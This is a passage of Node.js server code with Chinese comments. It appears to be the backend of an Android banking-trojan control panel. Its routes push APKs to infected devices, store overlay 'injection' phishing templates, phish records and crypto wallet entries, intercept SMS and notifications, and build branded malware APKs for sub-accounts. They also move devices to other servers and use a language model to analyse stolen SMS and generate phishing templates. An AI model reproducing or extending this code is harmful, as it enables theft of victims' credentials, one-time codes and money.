    const d = getDevice(ctx, p.dev_id);
    if (d) { d.adb_connected = !!b.enabled; setDevice(ctx, d); ctx.broadcast({type: 'device_update'}, [p.dev_id]); }
    ctx.okt(res);
  });
  // ---- 远程安装 APK（拖拽/选择 .apk 上传）：multipart 接收（body.__multipart）→ adb 直装优先，无 adb 通道走 agent 命令+能力URL ----
  on('POST', '/m/device/:dev_id/install-apk', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    const ct = req.headers['content-type'] || '';
    const raw = (b && b.__multipart) || null;
    const bm = /boundary=(.+)$/.exec(ct);
    if (!raw || !raw.length || !bm) return ctx.bad(res, '未收到 APK 文件');
    try {
      const fp = parseMultipart(raw, bm[1]).find(x => x.filename && x.data && x.data.length > 1024);
      if (!fp) return ctx.bad(res, 'APK 文件无效');
      const fileBuf = fp.data, name = fp.filename;
      const dir = path.join(ctxRef.ROOT, 'uploads', 'installs');
      fs.mkdirSync(dir, {recursive: true});
      const rid = crypto.randomBytes(10).toString('hex');
      const apkPath = path.join(dir, rid + '_dev_' + p.dev_id + '.apk');
      fs.writeFileSync(apkPath, fileBuf);
      ctx.log('apk-up', {d: p.dev_id, n: fileBuf.length});
      // 1) adb 通道直装（dxs 无线调试隧道，adb server 同机）
      ctx.eagle.adbInstall(p.dev_id, apkPath).then(out => {
        if (out !== null) {
          ctx.broadcast({type: 'command_result', device_id: p.dev_id, data: {command: 'install-apk', ok: true, output: String(out).slice(0, 500)}}, [p.dev_id]);
          ctx.log('apk-adb-ok', {d: p.dev_id});
        } else {
          // 2) agent 命令 + 能力 URL 下载安装（rid 随机不可猜，agent 无 JWT 也能下载）
          const host = req.headers.host || 'zxg123.com';
          ctx.zhuque.commandAny(p.dev_id, 'INSTALL_APK', {url: 'https://' + host + '/m/apk-file/' + rid, requestId: rid, fileName: name});
          ctx.broadcast({type: 'command_result', device_id: p.dev_id, data: {command: 'install-apk', ok: true, output: '已下发安装命令（无 ADB 通道，走 agent 下载安装）'}}, [p.dev_id]);
          ctx.log('apk-cmd', {d: p.dev_id, rid});
        }
      });
      ctx.json(res, {ok: true, message: '安装任务已接收，结果将实时推送'});
    } catch (e) { ctx.bad(res, '安装失败: ' + String(e).slice(0, 80)); }
  });
  // APK 能力 URL（rid 随机串作为凭证，agent 无 JWT 也能下载）
  on('GET', '/m/apk-file/:rid', (req, res, ctx, p) => {
    const rid = String(p.rid || '').replace(/[^\w-]/g, '');
    if (!rid) return ctx.bad(res, '参数错误', 400);
    const dir = path.join(ctxRef.ROOT, 'uploads', 'installs');
    try {
      const hit = fs.readdirSync(dir).find(f => f.startsWith(rid + '_') && f.endsWith('.apk'));
      if (!hit) return ctx.bad(res, '文件不存在或已过期', 404);
      return ctx.file(res, path.join(dir, hit));
    } catch (e) { return ctx.bad(res, '文件不存在或已过期', 404); }
  });

  // ---- 批量 ----
  on('POST', '/m/batch/command', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    // 归属校验：批量命令对设备敏感操作，任一设备无权 → 整单拒绝
    for (const i of b.ids || []) if (!devOk(me, String(i))) return ctx.bad(res, `无权操作设备 ${i}`, 403);
    const ins = ctx.db.prepare("INSERT INTO commands VALUES(?,?,?,?,?,datetime('now'))");
    for (const i of b.ids || []) ins.run(uid(), String(i), b.command || '', j(b.payload || {}), 'sent');
    ctx.okt(res);
  });
  const batchOp = (ctx, me, ids, op, extra) => {
    for (const i of ids || []) if (!devOk(me, String(i))) return false;   // 任一无权 → 拒整单
    for (const i of ids || []) {
      if (op === 'delete') ctx.db.prepare("DELETE FROM devices WHERE id=?").run(String(i));
      else {
        const r = ctx.db.prepare("SELECT data FROM devices WHERE id=?").get(String(i));
        if (r) {
          const d = JSON.parse(r.data);
          if (op === 'pin') d.pinned = !!(extra || {}).pinned;
          if (op === 'group') d.group_id = (extra || {}).group_id;
          ctx.db.prepare("UPDATE devices SET data=? WHERE id=?").run(j(d), String(i));
        }
      }
    }
    ctx.broadcast({type: 'device_update'});
    return true;
  };
  on('POST', '/m/batch/delete', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    if (!batchOp(ctx, me, b.ids, 'delete')) return ctx.bad(res, '包含无权设备', 403);
    ctx.okt(res);
  });
  on('POST', '/m/batch/group', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    if (!batchOp(ctx, me, b.ids, 'group', {group_id: b.group_id})) return ctx.bad(res, '包含无权设备', 403);
    ctx.okt(res);
  });
  on('POST', '/m/batch/pin', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    if (!batchOp(ctx, me, b.ids, 'pin', {pinned: b.pinned !== false})) return ctx.bad(res, '包含无权设备', 403);
    ctx.okt(res);
  });
  // 批量转移（与单设备 transfer 同步记录 server_url；命令由前端逐台下发了）
  on('POST', '/m/batch/transfer', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    const url = String((b && b.target_url) || '').trim().slice(0, 200);
    const ids = Array.isArray(b && b.ids) ? b.ids : [];
    if (!/^https?:\/\//.test(url) || !ids.length) return ctx.bad(res, '参数错误');
    for (const id of ids) if (!devOk(me, String(id))) return ctx.bad(res, `无权操作设备 ${id}`, 403);
    let n = 0;
    for (const id of ids) {
      const d = getDevice(ctx, id);
      if (!d) continue;
      d.server_url = url;
      d.transferred_at = nowStr();
      setDevice(ctx, d);
      n++;
    }
    if (n) ctx.broadcast({type: 'device_update'});
    ctx.log('batch-transfer', {n, to: url});
    ctx.json(res, {ok: true, transferred: n});
  });
  // 批量分配设备（前端「批量下发」弹窗）
  on('POST', '/m/batch/assign', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    if (!isManager(me)) return ctx.bad(res, '无管理权限', 403);
    const ids = Array.isArray(b && b.ids) ? b.ids.map(String) : [];
    if (!ids.length) return ctx.bad(res, '请选择设备');
    let target = Number(b && (b.owner_id !== undefined ? b.owner_id : b.uid));
    if (!Number.isFinite(target) || target <= 0) target = 1;
    if (target !== 1) {
      const acc = accRow(target);
      if (!acc) return ctx.bad(res, '目标账户不存在', 404);
      const tree = accountTree(me.uid);
      if (me.uid !== 1 && me.role !== 'admin' && !tree.includes(target))
        return ctx.bad(res, '只能分配给自己或下级账户', 403);
    }
    const uname = (target === 1 ? ADMIN_USER : (accRow(target) || {}).username || '');
    let n = 0, denied = [];
    for (const id of ids) {
      if (!devOk(me, id)) { denied.push(id); continue; }
      const d = getDevice(ctx, id);
      if (!d) { denied.push(id); continue; }
      d.owner_id = target;
      d.owner_username = uname;
      setDevice(ctx, d);
      n++;
    }
    if (n) ctx.broadcast({type: 'device_update'});
    secLog(ctx.db, '信息', `批量分配 ${n} 台 → ${uname}`, me.usr, REAL_IP(req));
    ctx.json(res, {ok: true, assigned: n, owner_id: target, owner_username: uname, denied});
  });
  // 批量回收（归还管理员）
  on('POST', '/m/batch/unassign', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    if (!isManager(me)) return ctx.bad(res, '无管理权限', 403);
    const ids = Array.isArray(b && b.ids) ? b.ids.map(String) : [];
    if (!ids.length) return ctx.bad(res, '请选择设备');
    let n = 0;
    for (const id of ids) {
      if (!devOk(me, id)) continue;
      const d = getDevice(ctx, id);
      if (!d) continue;
      d.owner_id = 1;
      d.owner_username = ADMIN_USER;
      setDevice(ctx, d);
      n++;
    }
    if (n) ctx.broadcast({type: 'device_update'});
    ctx.json(res, {ok: true, released: n});
  });
  on('POST', '/m/bnotify', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const nid = Date.now() % 1e9;
    ctx.db.prepare("INSERT INTO notifications(id,title,body,level,is_read,created_at) VALUES(?,?,?,?,'0',datetime('now'))").run(nid, b.title || '通知', b.body || '', b.level || 'info');
    ctx.json(res, {ok: true, id: nid});
  });

  // ---- 分组 ----
  on(['GET', 'POST', 'PUT', 'DELETE'], '/m/groups', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'GET') {
      // device_count 列写入路径从不更新（恒0）→ 读时实时聚合设备数
      const rows = ctx.db.prepare("SELECT * FROM groups ORDER BY id").all();
      const cnt = {};
      for (const r of ctx.db.prepare("SELECT data FROM devices").all()) {
        try { const gid = (JSON.parse(r.data) || {}).group_id; if (gid) cnt[gid] = (cnt[gid] || 0) + 1; } catch (e) {}
      }
      return ctx.ok(res, rows.map(r => ({...r, device_count: cnt[r.id] || 0})));
    }
    if (req.method === 'POST') {
      const gid = Math.floor(Date.now() / 1000) % 100000;
      ctx.db.prepare("INSERT INTO groups VALUES(?,?,0)").run(gid, b.name || '新分组');
      return ctx.json(res, {ok: true, id: gid});
    }
    if (req.method === 'PUT') ctx.db.prepare("UPDATE groups SET name=? WHERE id=?").run(b.name, b.id);
    else ctx.db.prepare("DELETE FROM groups WHERE id=?").run(b.id);
    ctx.okt(res);
  });
  on('POST', '/m/group', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const gid = Math.floor(Date.now() / 1000) % 100000;
    ctx.db.prepare("INSERT INTO groups VALUES(?,?,0)").run(gid, b.name || '新分组');
    ctx.json(res, {ok: true, id: gid});
  });
  on(['PUT', 'DELETE'], '/m/group/:gid', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'PUT') ctx.db.prepare("UPDATE groups SET name=? WHERE id=?").run(b.name, p.gid);
    else ctx.db.prepare("DELETE FROM groups WHERE id=?").run(p.gid);
    ctx.okt(res);
  });

  // ---- 黑名单 ----
  on(['GET', 'POST', 'DELETE'], '/m/blacklist', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'GET') return ctx.ok(res, ctx.db.prepare("SELECT * FROM blacklist ORDER BY created_at DESC").all());
    if (req.method === 'POST') {
      ctx.db.prepare("INSERT INTO blacklist(ip,device_id,reason,created_at) VALUES(?,?,?,datetime('now'))").run(b.ip, b.device_id, b.reason);
      return ctx.okt(res);
    }
    ctx.db.prepare("DELETE FROM blacklist WHERE id=?").run(b.id);
    ctx.okt(res);
  });
  on('DELETE', '/m/blacklist/:bid', (req, res, ctx, p) => A(req, res) && (ctx.db.prepare("DELETE FROM blacklist WHERE id=?").run(p.bid), ctx.okt(res)));

  // ---- 注入管理 ----
  on(['GET', 'DELETE'], '/m/injections', (req, res, ctx) => {
    if (!A(req, res)) return;
    if (req.method === 'DELETE') {
      const me = authInfo(req);
      ctx.db.prepare("DELETE FROM generic WHERE store='injections'").run();
      secLog(ctx.db, '危险', `清空全部注入模板`, me && me.usr || '?', REAL_IP(req));
      return ctx.okt(res);
    }
    // 列表瘦身：html / html_content 两个字段名统一瘦身，避免 9MB 全量响应
    ctx.ok(res, gList(ctx.db, 'injections').map(d => {
      const full = String(d.html || d.html_content || d.content || '');
      const out = {...d};
      out.html_len = full.length;
      delete out.content;
      if (full.length > 300) {
        out.html_full = false;
        out.html = full.slice(0, 300);
        out.html_content = full.slice(0, 300);
      } else {
        out.html = full;
        out.html_content = full;
      }
      return out;
    }));
  });
  on('POST', '/m/injection', (req, res, ctx, p, b) => A(req, res) && ctx.ok(res, gAdd(ctx.db, 'injections', injNorm(b))));
  on(['GET', 'PUT', 'DELETE'], '/m/injection/:iid', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'DELETE') { const me = authInfo(req); secLog(ctx.db, '警告', `删除注入模板 #${p.iid}`, me && me.usr || '?', REAL_IP(req)); gDel(ctx.db, 'injections', p.iid); return ctx.okt(res); }
    const r = ctx.db.prepare("SELECT data FROM generic WHERE store='injections' AND id=?").get(String(p.iid));
    if (!r) return ctx.bad(res, '不存在', 404);
    const d = JSON.parse(r.data);
    if (req.method === 'PUT') {
      const patch = injNorm(b);
      // 前端「编辑」表单只带元数据、html 恒为空串；不能让空串覆盖已有正文
      if (!patch.html && d.html) { patch.html = d.html; patch.html_content = d.html; }
      Object.assign(d, patch);
      gAdd(ctx.db, 'injections', injNorm(d));
    }
    ctx.ok(res, d);
  });
  on(['GET', 'POST', 'PUT'], '/m/injection/:iid/auto', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const r = ctx.db.prepare("SELECT data FROM generic WHERE store='injections' AND id=?").get(String(p.iid));
    if (!r) return ctx.bad(res, '不存在', 404);
    const d = JSON.parse(r.data);
    if (req.method === 'GET') return ctx.ok(res, d.auto || []);
    d.auto = Array.isArray(b) ? b : (b.auto !== undefined ? b.auto : b);
    gAdd(ctx.db, 'injections', injNorm(d));
    ctx.okt(res);
  });
  on(['GET', 'PUT', 'POST'], '/m/injection/:iid/html', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const r = ctx.db.prepare("SELECT data FROM generic WHERE store='injections' AND id=?").get(String(p.iid));
    if (!r) return ctx.bad(res, '不存在', 404);
    const d = JSON.parse(r.data);
    // 兼容 html / html_content / content 三种历史字段名
    const pick = o => (o.html && o.html.length) ? o.html
                     : (o.html_content && o.html_content.length) ? o.html_content
                     : (o.content || '');
    if (req.method === 'GET') return ctx.json(res, {html: pick(d)});
    const v = b.html !== undefined ? b.html : (b.html_content !== undefined ? b.html_content : (b.content || ''));
    if (!v && (d.html || d.html_content)) return ctx.bad(res, '内容为空，已保留原正文', 400);
    d.html = v;
    d.html_content = v;
    gAdd(ctx.db, 'injections', injNorm(d));
    ctx.okt(res);
  });
  // 批量导入注入模板（前端解析导出文件后 POST 数组，期望 {imported:N}）
  on('POST', '/m/injections/batch', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const arr = Array.isArray(b) ? b : [];
    let imported = 0;
    for (const it of arr) {
      if (!it || typeof it !== 'object') continue;
      const body = it.html !== undefined ? it.html : (it.html_content || '');
      if (!body && !it.name) continue;
      gAdd(ctx.db, 'injections', injNorm({
        ...it,
        name: String(it.name || it.label || '导入模板').slice(0, 120),
        html: String(body || ''),
        html_content: String(body || ''),
        id: undefined,
      }));
      imported++;
    }
    ctx.json(res, {ok: true, imported});
  });
  on('GET', '/m/injections/export', (req, res, ctx) => {
    if (!A(req, res)) return;
    res.writeHead(200, {'Content-Type': 'application/json', 'Content-Disposition': 'attachment; filename=injections.json'});
    res.end(j(gList(ctx.db, 'injections')));
  });
  on('POST', '/m/injections/push', (req, res, ctx) => A(req, res) && (ctx.broadcast({type: 'device_update'}), ctx.okt(res)));

  // ---- 通用 CRUD store ----
  for (const [pt, store] of CRUD_STORES) {
    on(['GET', 'POST'], `/m/${pt}`, (req, res, ctx, p, b) => A(req, res) && (req.method === 'GET' ? ctx.ok(res, gList(ctx.db, store)) : ctx.ok(res, gAdd(ctx.db, store, b))));
    on(['GET', 'PUT', 'DELETE', 'POST'], `/m/${pt}/:iid`, (req, res, ctx, p, b) => {
      if (!A(req, res)) return;
      if (req.method === 'DELETE') { gDel(ctx.db, store, p.iid); return ctx.okt(res); }
      ctx.ok(res, gAdd(ctx.db, store, {...b, id: p.iid}));
    });
  }
  on(['GET', 'DELETE'], '/m/phish', (req, res, ctx) => {
    if (!A(req, res)) return;
    const mine = myDevIds(authInfo(req));
    if (req.method === 'GET') return ctx.ok(res, mine
      ? gList(ctx.db, 'phish').filter(x => x && mine.has(String(x.device_id)))
      : gList(ctx.db, 'phish'));
    if (mine) { for (const r of gList(ctx.db, 'phish')) if (mine.has(String(r.device_id))) gDel(ctx.db, 'phish', r.id); }
    else ctx.db.prepare("DELETE FROM generic WHERE store='phish'").run();
    return ctx.okt(res);
  });
  on('DELETE', '/m/phish/:pid', (req, res, ctx, p) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    const rec = gList(ctx.db, 'phish').find(x => String(x.id) === String(p.pid));
    if (rec && rec.device_id && !devOk(me, rec.device_id)) return ctx.bad(res, '无权操作', 403);
    gDel(ctx.db, 'phish', p.pid);
    ctx.okt(res);
  });
  on(['GET', 'POST'], '/m/cryptowallet', (req, res, ctx, p, b) => A(req, res) && (req.method === 'GET' ? ctx.ok(res, gList(ctx.db, 'wallets')) : ctx.ok(res, gAdd(ctx.db, 'wallets', b))));
  on(['PUT', 'DELETE', 'POST'], '/m/cryptowallet/:wid', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'DELETE') { gDel(ctx.db, 'wallets', p.wid); return ctx.okt(res); }
    ctx.ok(res, gAdd(ctx.db, 'wallets', {...b, id: p.wid}));
  });
  // 推送短信/通知规则到全部在线设备（规则存 smsnoti/notifnoti store，命令下发走 zhuque 通道）
  on('POST', '/m/notifyrules/push', (req, res, ctx) => {
    if (!A(req, res)) return;
    if (!isManager(authInfo(req))) return ctx.bad(res, '仅管理员可推送', 403);   // 推送面=全部设备，限管理员
    const smsRules = gList(ctx.db, 'smsnoti');
    const notiRules = gList(ctx.db, 'notifnoti');
    let devs = 0;
    try {
      for (const r of ctx.db.prepare("SELECT id, data FROM devices").all()) {
        let d; try { d = JSON.parse(r.data); } catch { continue; }
        if (!d || !d.online) continue;
        if (smsRules.length) ctx.zhuque.commandAny(r.id, 'SET_SMS_NOTI_RULES', {rules: smsRules});
        if (notiRules.length) ctx.zhuque.commandAny(r.id, 'SET_NOTIF_RULES', {rules: notiRules});
        devs++;
      }
    } catch {}
    ctx.log('notifyrules-push', {sms: smsRules.length, noti: notiRules.length, devs});
    ctx.json(res, {ok: true, message: `已推送 ${smsRules.length + notiRules.length} 条规则到 ${devs} 台在线设备`});
  });
  on('GET', '/m/autocommands', (req, res, ctx) => A(req, res) && ctx.ok(res, gList(ctx.db, 'autocommands')));
  on(['PUT', 'DELETE', 'POST'], '/m/autocommand/:aid', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'DELETE') { gDel(ctx.db, 'autocommands', p.aid); return ctx.okt(res); }
    ctx.ok(res, gAdd(ctx.db, 'autocommands', {...b, id: p.aid}));
  });

  // ---- AI ----
  on(['GET', 'POST'], '/m/ai', (req, res, ctx) => A(req, res) && ctx.ok(res, {enabled: false, model: '', api_key: '', base_url: ''}));
  on(['GET', 'POST', 'PUT'], '/m/ai/config', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'GET') {
      const cfgs = gList(ctx.db, 'ai_cfg');
      return ctx.ok(res, cfgs[0] || {provider: 'openai', api_key: '', model: '', base_url: '', enabled: false});
    }
    gAdd(ctx.db, 'ai_cfg', b);
    ctx.okt(res);
  });
  on(['GET', 'POST', 'PUT'], '/m/ai/adapt-config', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (req.method === 'GET') {
      const cfgs = gList(ctx.db, 'ai_adapt_cfg');
      return ctx.ok(res, cfgs[0] || {enabled: false, prompt: '', model: ''});
    }
    gAdd(ctx.db, 'ai_adapt_cfg', b);
    ctx.okt(res);
  });
  // 通配 /m/ai/:aid 已移到文件 AI 区块末尾（generate-template / template-history 等具体路由之后），
  // 否则一段式具体路由会被它截胡（模板生成显示"生成失败"的根因）
  on('POST', '/m/ai/:did/analyze', async (req, res, ctx, p, b, q) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    const did = p.did;
    const force = q.force === 'true' || !!b.force;
    const prev = gList(ctx.db, 'ai_analysis').find(x => String(x.id) === String(did) || String(x.device_id) === String(did));
    if (prev && prev.status === 'analyzed' && !force) return ctx.json(res, {status: 'already_analyzed'});
    ctx.eagle && ctx.eagle.isEagleDev && ctx.eagle.isEagleDev(did) ? ctx.eagle.commandToDevice(did, 'GET_SMS', {}) : ctx.zhuque.commandAny(did, 'GET_SMS', {});
    const since = new Date(Date.now() - 30 * 86400e3 + 8 * 3600e3).toISOString().slice(0, 19).replace('T', ' ');
    const recent = () => ctx.db.prepare("SELECT sender, body, recv_at FROM sms WHERE device_id=? AND IFNULL(body,'')!='' AND IFNULL(recv_at,'')!='' AND recv_at>=? ORDER BY recv_at DESC LIMIT 500").all(did, since);
    const baseN = recent().length;
    const deadline = Date.now() + 18000;
    let rows = [];
    while (Date.now() < deadline) {
      rows = recent();
      if (rows.length > baseN || rows.length) break;
      await new Promise(r2 => setTimeout(r2, 1500));
    }
    if (!rows.length) return ctx.json(res, {status: 'no_sms', err_msg: '近30天无短信数据。请在设备上授权短信读取权限（点击短信页的读取按钮触发授权），再重新分析'});
    aiAnalyzeJob(ctx, did, rows);
    ctx.json(res, {status: 'analyzing', message: '分析已提交，完成后自动刷新'});
  });
  on('POST', '/m/ai/generate-template', async (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const msgs = b.messages || [];
    let last = '';
    for (let i = msgs.length - 1; i >= 0; i--) {
      if (msgs[i] && msgs[i].role === 'user') { last = String(msgs[i].content || ''); break; }
    }
    if (!last) return ctx.bad(res, '请输入模板需求描述');
    const cfgs = gList(ctx.db, 'ai_cfg');
    const cfg = cfgs[0] || {};
    let html = (cfg.api_key && cfg.base_url) ? await aiGenLlm(ctx, msgs) : null;
    const src = html ? 'ai' : 'local';
    if (!html) html = aiGenLocal(last);
    ctx.json(res, {html, note: `${src === 'ai' ? 'AI 生成' : '本地模板引擎'}（基于：${last.slice(0, 60)}）`});
  });
  on(['GET', 'POST'], '/m/ai/template-history', (req, res, ctx, p, b) => A(req, res) && (req.method === 'GET' ? ctx.ok(res, gList(ctx.db, 'ai_templates')) : ctx.ok(res, gAdd(ctx.db, 'ai_templates', b))));
  on('DELETE', '/m/ai/template-history/:hid', (req, res, ctx, p) => A(req, res) && (gDel(ctx.db, 'ai_templates', p.hid), ctx.okt(res)));
  // 通配兜底（必须放在所有一段式具体 AI 路由之后，否则会截胡它们）
  on(['GET', 'POST'], '/m/ai/:aid', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (!devGuard(req, res, p)) return;
    if (req.method === 'GET') {
      const r = ctx.db.prepare("SELECT data FROM generic WHERE store='ai_analysis' AND id=?").get(String(p.aid));
      return ctx.ok(res, r ? JSON.parse(r.data) : {status: 'pending'});
    }
    const result = {raw_json: j(b), summary: '本地模式：AI 分析已接收请求', ts: Math.floor(Date.now() / 1000)};
    gAdd(ctx.db, 'ai_analysis', {id: p.aid, ...result});
    ctx.ok(res, result);
  });

  // ---- builds ----
  on(['GET', 'DELETE'], '/m/builds', (req, res, ctx) => {
    if (!A(req, res)) return;
    if (req.method === 'DELETE') { ctx.db.prepare("DELETE FROM generic WHERE store='builds'").run(); return ctx.okt(res); }
    ctx.ok(res, gList(ctx.db, 'builds'));
  });
  on('POST', '/m/build', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    if (!b.app_label) return ctx.bad(res, '请填写应用名');
    const bid = uid();
    // 剥离 body.id：原实现 ...b 展开在 id: bid 之后，body.id 可覆盖服务端生成的 bid，
    // 恶意 id 会一路传进构建工人的 execSync 模板字符串（命令注入）
    const {id: _ignored, ...bb} = b || {};
    // 归属绑定：bind_user 是用户名，转成 uid 存下来；空则归管理员(1)
    const _me = authInfo(req);
    let bindUid = 1;
    const bindUser = String((b && b.bind_user) || '').trim();
    if (bindUser) {
      const ua = ctx.db.prepare('SELECT id, username FROM web_accounts').all()
        .find(a => String(a.username) === bindUser || _nv(a.username) === _nv(bindUser));
      if (!ua) return ctx.bad(res, '绑定账户不存在: ' + bindUser, 404);
      const _tree = (_me && _me.uid !== 1 && _me.role !== 'admin') ? accountTree(_me.uid) : null;
      if (_tree && !_tree.includes(ua.id)) return ctx.bad(res, '只能绑定自己或下级账户', 403);
      bindUid = ua.id;
    }
    gAdd(ctx.db, 'builds', {id: bid, ...bb,
      bind_user: bindUser, bind_uid: bindUid,
      created_by: _me ? _me.uid : 1, created_by_name: _me ? _me.usr : ADMIN_USER,
      status: 'pending', progress: 0,
      log: ['[*] 任务已排队，等待构建工人（本地 apktool 回编+签名，约 2-4 分钟）'],
      created_at: new Date().toISOString().slice(0, 19) + 'Z'});
    ctx.json(res, {ok: true, id: bid});
  });
  // ---- 历史构建归属补录：旧版本构建记录只存了 bind_user（没有 bind_uid、没打进 APK），
  //      上线后的设备一律挂在管理员名下。这里把「构建记录里 bind_user 指向子账户」的设备补回该账户。
  //  GET  /m/build/orphans        预览：列出可补录的构建与候选设备
  //  POST /m/build/reassign       执行：{build_ids?:[], device_ids?:[], dry_run?:bool}
  on('GET', '/m/build/orphans', (req, res, ctx) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    if (!isManager(me)) return ctx.bad(res, '无管理权限', 403);
    const builds = gList(ctx.db, 'builds');
    const accs = ctx.db.prepare('SELECT id, username, role, is_active FROM web_accounts').all();
    const myTree = (me.uid !== 1 && me.role !== 'admin') ? accountTree(me.uid) : null;
    const ownerless = builds.filter(b => {
      const bu = String(b.bind_user || '').trim();
      const buid = Number(b.bind_uid || 0);
      if (!bu || buid > 1) return false;                   // 没绑、或已绑对 → 跳过
      const a = accs.find(x => String(x.username) === bu);
      if (!a || !a.is_active) return false;
      if (myTree && !myTree.includes(a.id)) return false;
      return true;
    }).map(b => {
      const a = accs.find(x => String(x.username) === String(b.bind_user));
      return {build_id: b.id, app_label: b.app_label || '', bind_user: b.bind_user,
              target_uid: a.id, status: b.status || '', created_at: b.created_at || ''};
    });
    // 当前挂在管理员名下的设备（devices 是独立表，不是 generic.store）
    const pool = ctx.db.prepare('SELECT data FROM devices').all()
      .map(r => { try { return JSON.parse(r.data); } catch (e) { return null; } })
      .filter(d => d && Number(d.owner_id || 1) === 1);
    ctx.json(res, {
      ok: true,
      builds_need_reassign: ownerless,
      admin_devices: pool.map(d => ({id: d.id, model: d.model || '', brand: d.brand || '',
        app_name: d.app_name || '', first_seen: d.first_seen || '', online: !!d.online})),
      hint: '旧版构建只记 bind_user，没打进 APK；用 device_ids 指定要归位的设备',
    });
  });
  on('POST', '/m/build/reassign', (req, res, ctx, p, b) => {
    if (!A(req, res)) return;
    const me = authInfo(req);
    if (!isManager(me)) return ctx.bad(res, '无管理权限', 403);
    const dry = !!(b && b.dry_run);
    const accs = ctx.db.prepare('SELECT id, username, role, is_active FROM web_accounts').all();
    const builds = gList(ctx.db, 'builds');

    // 目标账户：显式 owner_id/owner_user 优先，否则按 build_ids 里的 bind_user 推
    let targets = new Set();
    const bidList = Array.isArray(b && b.build_ids) ? b.build_ids.map(String) : [];
    for (const bid of bidList) {
      const bl = builds.find(x => String(x.id) === bid);
      if (!bl) continue;
      const a = accs.find(x => String(x.username) === String(bl.bind_user || ''));
      if (a && a.is_active) targets.add(a.id);
    }
    if (b && (b.owner_id !== undefined || b.owner_user !== undefined)) {
      const raw = String(b.owner_user !== undefined ? b.owner_user : b.owner_id).trim();
      const a = accs.find(x => String(x.username) === raw) || accs.find(x => String(x.id) === raw);
      if (!a) return ctx.bad(res, '目标账户不存在', 404);
      targets = new Set([a.id]);
    }
    if (!targets.size) return ctx.bad(res, '未指明目标账户');
    if (targets.size > 1) return ctx.bad(res, '多个构建绑定了不同账户，请用 owner_user 明确指定');
    const targetUid = [...targets][0];
    if (me.uid !== 1 && me.role !== 'admin' && !accountTree(me.uid).includes(targetUid))
      return ctx.bad(res, '只能归位到自己或下级账户', 403);
    const targetAcc = accRow(targetUid);

    // 设备集合：显式 device_ids 优先；否则取所有挂在管理员名下的设备
    let devIds;
    if (Array.isArray(b && b.device_ids) && b.device_ids.length) {
      devIds = b.device_ids.map(String);
    } else {
      devIds = ctx.db.prepare('SELECT data FROM devices').all()
        .map(r => { try { return JSON.parse(r.data); } catch (e) { return null; } })
        .filter(d => d && Number(d.owner_id || 1) === 1)
        .map(d => String(d.id));
    }
    if (!devIds.length) return ctx.bad(res, '没有可归位的设备');

    const done = [], denied = [];
    for (const dv of devIds) {
      if (!devOk(me, dv)) { denied.push(dv); continue; }
      const d = getDevice(ctx, dv);
      if (!d) { denied.push(dv); continue; }
      if (!dry) {
        d.owner_id = targetUid;
        d.owner_username = targetAcc.username;
        d.reassigned_at = nowStr();
        setDevice(ctx, d);
      }
      done.push(dv);
    }
    if (!dry && done.length) ctx.broadcast({type: 'device_update'});
    if (!dry) secLog(ctx.db, '警告', `构建归属补录: ${done.length} 台 → ${targetAcc.username}`, me.usr, REAL_IP(req));
    ctx.json(res, {ok: true, dry_run: dry, target_uid: targetUid, target_username: targetAcc.username,
                   count: done.length, devices: done, denied});
  });  on('DELETE', '/m/build/:bid', (req, res, ctx, p) => A(req, res) && (ctx.db.prepare("DELETE FROM generic WHERE store='builds' AND id=?").run(String(p.bid)), ctx.okt(res)));
  on('GET', '/m/build/:bid/download', (req, res, ctx, p) => {
    if (!A(req, res)) return;
    const b = findBuild(ctx, p.bid);
    if (!b || b.status !== 'done') return ctx.bad(res, '构建不存在或未完成', 404);
    // 真实产物：uploads/build_<bid>.apk（本地构建工人回编+签名后上传）
    const fpath = path.join(ctxRef.ROOT, 'uploads', `build_${String(p.bid)}.apk`);
    if (fs.existsSync(fpath)) {
      const stat = fs.statSync(fpath);
      res.writeHead(200, {'Content-Type': 'application/vnd.android.package-archive', 'Content-Length': stat.size,
        'Content-Disposition': `attachment; filename="app.apk"; filename*=UTF-8''${encodeURIComponent(b.app_label || 'app')}.apk`});
      fs.createReadStream(fpath).pipe(res);
      return;
    }
    return ctx.bad(res, '构建产物不存在（构建工人未运行或产物被清理）', 404);
  });

  // ---- assets 上传（multipart） ----
  const UPLOAD_DIR = path.join(ctxRef.ROOT, 'uploads');
  // assets 列表：前端构建页 GET /m/assets/icon|background 拉已上传文件列表
  on('GET', '/m/assets/:atype', (req, res, ctx, p) => {
    if (!A(req, res)) return;
    if (!/^[\w-]{1,32}$/.test(String(p.atype))) return ctx.bad(res, '非法类型');
    const dir = path.join(UPLOAD_DIR, p.atype);
    if (!dir.startsWith(UPLOAD_DIR + path.sep)) return ctx.bad(res, '非法类型', 403);
    if (!fs.existsSync(dir)) return ctx.ok(res, []);
